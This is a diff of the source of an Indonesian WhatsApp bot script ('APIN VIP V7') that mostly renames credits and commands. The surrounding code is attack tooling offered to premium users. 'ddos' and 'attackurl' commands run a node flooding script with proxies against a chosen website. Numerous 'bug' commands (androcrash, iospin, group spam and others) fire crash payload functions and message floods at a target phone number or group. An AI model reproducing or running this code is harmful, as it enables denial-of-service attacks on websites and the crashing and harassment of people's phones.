 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -3112,13 +3007,13 @@ m.reply(`─✈
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
 ││✑${prefix}ddos *url time rps thread*
 ││✑${prefix}attackurl *url time rps thread*
 ││✑${prefix}fetch *url time rps thread*
 ││✑${prefix}checkhost *url*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -3129,16 +3024,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -3157,7 +3047,8 @@ m.reply(`─✈
 ┌└─────────────┈ ✈
 ││✑${prefix}attackbug
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -3169,16 +3060,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -3225,7 +3111,8 @@ m.reply(`─✈
 ││
 ││*#NOTE : HABIS SEND BUG TUNGGU BOT NYA BILANG SUCCES BARU CEK TARGETNYA DI JAMIN *C1*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -3237,16 +3124,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -3262,50 +3144,24 @@ m.reply(`─✈
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
-││*BUG EMOJI*
-││✑${prefix}😂 *628xxx*
-││
-││*BUG VIRTEX #1*
-││✑${prefix}virtex1 *628xxx*
-││
-││*BUG VIRTEX #2*
+││*BUG ANDROID*
+││✑${prefix}sqlpin *628xxx*
+││✑${prefix}dbpin *628xxx*
 ││✑${prefix}slayer07 *628xxx*
 ││✑${prefix}darkness *628xxx*
 ││
-││*BUG LOKASI*
-││✑${prefix}lokas1 *628xxx*
-││
-││*BUG DOKUMEN*
-││✑${prefix}doku1 *628xxx*
-││
-││*BUG AUDIO*
-││✑${prefix}audio1 *628xxx*
-││
-││*BUG GAMBAR*
-││✑${prefix}gambar1 *628xxx*
-││
-││*BUG KONTAK*
-││✑${prefix}kontak1 *628xxx*
-││
-││*BUG VIDEO*
-││✑${prefix}video1 *628xxx*
-││
-││*BUG SANTET*
-││✑${prefix}santet  *628xxx*
-││
-││*BUG IPHONE*
-││✑${prefix}ipcrash  *628xxx*
+││*BUG IOS*
+││✑${prefix}iospin  *628xxx*
 ││
 ││*BUG WAKTU*
-││✑${prefix}qiogas *628xxx|waktu*
+││✑${prefix}clock *628xxx|waktu*
 ││
 ││*BUG JUMLAH*
-││✑${prefix}gasbugqio *628xxx|jumlah*
+││✑${prefix}amount *628xxx|jumlah*
 ││
 ││*BUG SPAM GROUP*
-││✑${prefix}buttongc *link group*
-││✑${prefix}gcspam *link group*
+││✑${prefix}admin *link group*
+││✑${prefix}member *link group*
 ││
 ││*BUG KUDETA*
 ││✑${prefix}kudetathp1 *REPLY IMAGE*
@@ -3318,7 +3174,8 @@ m.reply(`─✈
 ││
 ││*#NOTE : HABIS SEND BUG TUNGGU BOT NYA BILANG SUCCES BARU CEK TARGETNYA DI JAMIN *C1*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -3341,16 +3198,11 @@ m.reply(`
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -3389,16 +3241,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -3803,7 +3650,8 @@ m.reply(`─✈
 ││✑${prefix}txtunbanspam
 ││✑${prefix}txtunbantinjau
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -3816,14 +3664,14 @@ qioreply(jsonData)
 break
 //=================================================//
 case 'sc': case 'script': {
-m.reply(`Sc Ini Dibuat Oleh Alfin Faridh Taufiqiy.
+m.reply(`Sc Ini Dibuat Oleh 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈.
 
 
-🔏Created : Alfin Faridh Taufiqiy
-🔏Base : Alfin Faridh Taufiqiy
+🔏Created : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+🔏Base : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 
 ❕Youtube : ${global.yt}
-❗Telwgram : t.me/apintrava
+❗Telwgram : t.me/coreinpin/
 
 `)
 }
@@ -3834,7 +3682,7 @@ let namaown = `Owner Cakep`
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
 "displayName": `${namaown}`,
-"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ Alfin Faridh Taufiqiy ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ Alfin Faridh Taufiqiy ༑ ]]\nEND:VCARD`,
+"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 ༑ ]]\nEND:VCARD`,
 }
 }), { userJid: m.chat, quoted: m })
 qio.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -12870,7 +12718,7 @@ let thread = q.split(" ")[2]
 let rate = q.split(" ")[3]
 if (args.length === 4 && url && time && thread && rate) {
 m.reply(`Sucess Menyerang Website : ${url}, Website akan eror dalam waktu ${time}`);
-exec(`node ./Ⓒঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄.js ${url} ${time} ${thread} ${rate} ./proxy.txt`, (err, stdout) => {
+exec(`node ./APINSTORE.ID ${url} ${time} ${thread} ${rate} ./proxy.txt`, (err, stdout) => {
 if (err) return console.log(err.toString())
 if (stdout) return console.log(util.format(stdout))
 })
@@ -12888,7 +12736,7 @@ let thread = q.split(" ")[2]
 let rate = q.split(" ")[3]
 if (args.length === 4 && url && time && thread && rate) {
 m.reply(`Sucess Menyerang Website : ${url}, Website akan eror dalam waktu ${time}`);
-exec(`node ./Ⓑঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄.js ${url} ${time} ${rate} ${thread} ./proxy.txt`, (err, stdout) => {
+exec(`node ./APIN VIP V7 ${url} ${time} ${rate} ${thread} ./proxy.txt`, (err, stdout) => {
 if (err) return console.log(err.toString())
 if (stdout) return console.log(util.format(stdout))
 })
@@ -12954,7 +12802,7 @@ message: {
       "text": "Klik Chech Host Untuk Untuk Memeriksa Web"
     },
     "footer": {
-      "text": "ঔৣ⃕᭝Alfin Faridh Taufiqiy𝐳᭄ Top"
+      "text": "𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈"
     },
     "nativeFlowMessage": {
       "buttons": [
@@ -13076,7 +12924,7 @@ await m.reply(`_silahlan di cek, target sudah_ *c1*`)
 }
 break
 
-case 'gasbugqio': case 'oemji': case 'lawack': {
+case 'amount': case 'oemji': case 'lawack': {
 if (!isPrem) return qioreply(mess.prem)
 if (!qtext) return m.reply(`Command Salah Silahkan Gunakan Command ${command} nomor|jumlah`)
 Pe = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
@@ -13096,10 +12944,10 @@ await dokucrash(Pe, qiobatosai)
 await iponcrash(Pe, qiobatosai)
 await iponcrash(Pe)
 await crashasu(Pe, qiobatosai)
-qio.sendMessage(Pe, {text: `Alfin Faridh Taufiqiy`}, {quoted:m})
-qio.sendMessage(Pe, {text: `Alfin Faridh Taufiqiy`}, {quoted:m})
-qio.sendMessage(Pe, {text: `Alfin Faridh Taufiqiy`}, {quoted:m})
-qio.sendMessage(Pe, {text: `Alfin Faridh Taufiqiy`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝙒𝙖𝙣𝙜𝙘𝙖𝙥Δ`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝙒𝙖𝙣𝙜𝙘𝙖𝙥Δ`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝙒𝙖𝙣𝙜𝙘𝙖𝙥Δ`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝘼𝙡𝙬𝙖𝙮𝙨𝙖𝙦𝙞𝙤𝙤 𝙒𝙖𝙣𝙜𝙘𝙖𝙥Δ`}, {quoted:m})
 lokascrash(Pe, qiobatosai)
 dokucrash(Pe, qiobatosai)
 virgamcrash(Pe, qiobatosai)
@@ -13277,7 +13125,7 @@ await m.reply(`done🥱`)
 break
 
 
-case 'virtex1': case 'virtex2': case 'virtex3': {
+case 'dbpin': case 'virtex2': case 'virtex3': {
 if (!isPrem) return qioreply(mess.prem)
 if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
 let pepec = q.replace(/[^0-9]/g, "")
@@ -13399,10 +13247,10 @@ await dokucrash(Pe, qiobatosai)
 await iponcrash(Pe, qiobatosai)
 await iponcrash(Pe)
 await crashasu(Pe, qiobatosai)
-qio.sendMessage(Pe, { image: santet,  caption: `https://www.instagram.com/coreinpin/` }, { quoted:m })
-qio.sendMessage(Pe, { image: santet,  caption: `https://www.instagram.com/coreinpin/` }, { quoted:m })
-qio.sendMessage(Pe, { image: santet,  caption: `https://www.instagram.com/coreinpin/` }, { quoted:m })
-qio.sendMessage(Pe, { image: santet,  caption: `https://www.instagram.com/coreinpin/` }, { quoted:m })
+qio.sendMessage(Pe, { image: santet,  caption: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋` }, { quoted:m })
+qio.sendMessage(Pe, { image: santet,  caption: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋` }, { quoted:m })
+qio.sendMessage(Pe, { image: santet,  caption: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋` }, { quoted:m })
+qio.sendMessage(Pe, { image: santet,  caption: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋` }, { quoted:m })
 lokascrash(Pe, qiobatosai)
 dokucrash(Pe, qiobatosai)
 virgamcrash(Pe, qiobatosai)
@@ -13415,7 +13263,7 @@ await m.reply(`_silahlan di cek, target sudah_ *c1*`)
 break
 
 
-case 'androcrash': case 'gaskenqio': case '☠️': case '🗿': case '⚡': case '😂': case '😈': case '🩸': case '😳': case '🥶': case '💦': {
+case 'androcrash': case 'gaskenqio': case '☠️': case '🗿': case '⚡': case 'sqlpin': case '😈': case '🩸': case '😳': case '🥶': case '💦': {
 if (!isPrem) return qioreply(mess.prem)
 if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
 let pepec = q.replace(/[^0-9]/g, "")
@@ -13434,10 +13282,10 @@ await dokucrash(Pe, qiobatosai)
 await iponcrash(Pe, qiobatosai)
 await iponcrash(Pe)
 await crashasu(Pe, qiobatosai)
-qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/`}, {quoted:m})
-qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/`}, {quoted:m})
-qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/`}, {quoted:m})
-qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋`}, {quoted:m})
 lokascrash(Pe, qiobatosai)
 dokucrash(Pe, qiobatosai)
 virgamcrash(Pe, qiobatosai)
@@ -13620,7 +13468,7 @@ await m.reply(`_silahlan di cek, target sudah_ *c1*`)
 }
 break
 //=================================================//
-case 'pccrash': case 'ipcrash': {
+case 'pccrash': case 'iospin': {
 if (!isPrem) return qioreply(mess.prem)
 if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
 let pepec = q.replace(/[^0-9]/g, "")
@@ -13647,10 +13495,10 @@ await dokucrash(Pe, qiobatosai)
 await iponcrash(Pe, qiobatosai)
 await iponcrash(Pe)
 await crashasu(Pe, qiobatosai)
-qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/${buttonqio}`}, {quoted:m})
-qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/${buttonqio}`}, {quoted:m})
-qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/${buttonqio}`}, {quoted:m})
-qio.sendMessage(Pe, {text: `https://www.instagram.com/coreinpin/${buttonqio}`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈️${buttonqio}`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈️${buttonqio}`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈️${buttonqio}`}, {quoted:m})
+qio.sendMessage(Pe, {text: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈️${buttonqio}`}, {quoted:m})
 lokascrash(Pe, qiobatosai)
 dokucrash(Pe, qiobatosai)
 virgamcrash(Pe, qiobatosai)
@@ -13662,7 +13510,7 @@ await m.reply(`_silahlan di cek, target sudah_ *c1*`)
 }
 break
 //=================================================//
-case 'qioelitceesnew': case 'qioslebew': case 'lembu': case 'qiogas': {
+case 'qioelitceesnew': case 'clock': case 'lembu': case 'qiogas': {
 if (!isPrem) return qioreply(mess.prem)
 if (!q) return m.reply(`Penggunaan .${command} 628xxx|1\n# memasukkan 1 sama dengan 300.detik`)
 let ppek = q.split("|")[0]
@@ -13685,10 +13533,10 @@ await dokucrash(Pe, qiobatosai)
 await iponcrash(Pe, qiobatosai)
 await iponcrash(Pe)
 await crashasu(Pe, qiobatosai)
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
+qio.sendMessage(Pe, {text: 'CRASH GA ?'}, {quoted:m})
+qio.sendMessage(Pe, {text: 'CRASH GA ?'}, {quoted:m})
+qio.sendMessage(Pe, {text: 'CRASH GA ?'}, {quoted:m})
+qio.sendMessage(Pe, {text: 'CRASH GA ?'}, {quoted:m})
 lokascrash(Pe, qiobatosai)
 dokucrash(Pe, qiobatosai)
 virgamcrash(Pe, qiobatosai)
@@ -13700,7 +13548,7 @@ await m.reply(`_silahlan di cek, target sudah_ *c1*`)
 }
 break
 //=================================================//
-case 'buttongc': case 'gcampas': {
+case 'admin': case 'gcampas': {
 if (!isPrem) return qioreply(mess.prem)
 if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
 qioreply(mess.bugrespon)
@@ -13734,7 +13582,7 @@ await m.reply(`_silahlan di cek, target sudah_ *c1*`)
 }
 break
 //=================================================//
-case 'qioelitceesgc': case 'crashasu': case 'crashgc': case 'gcspam': {
+case 'qioelitceesgc': case 'crashasu': case 'crashgc': case 'member': {
 if (!isPrem) return qioreply(mess.prem)
 if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
 await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
@@ -13752,10 +13600,10 @@ await dokucrash(Pe, qiobatosai)
 await iponcrash(Pe, qiobatosai)
 await iponcrash(Pe)
 await crashasu(Pe, qiobatosai)
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
+qio.sendMessage(Pe, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋'}, {quoted:m})
+qio.sendMessage(Pe, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋'}, {quoted:m})
+qio.sendMessage(Pe, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋'}, {quoted:m})
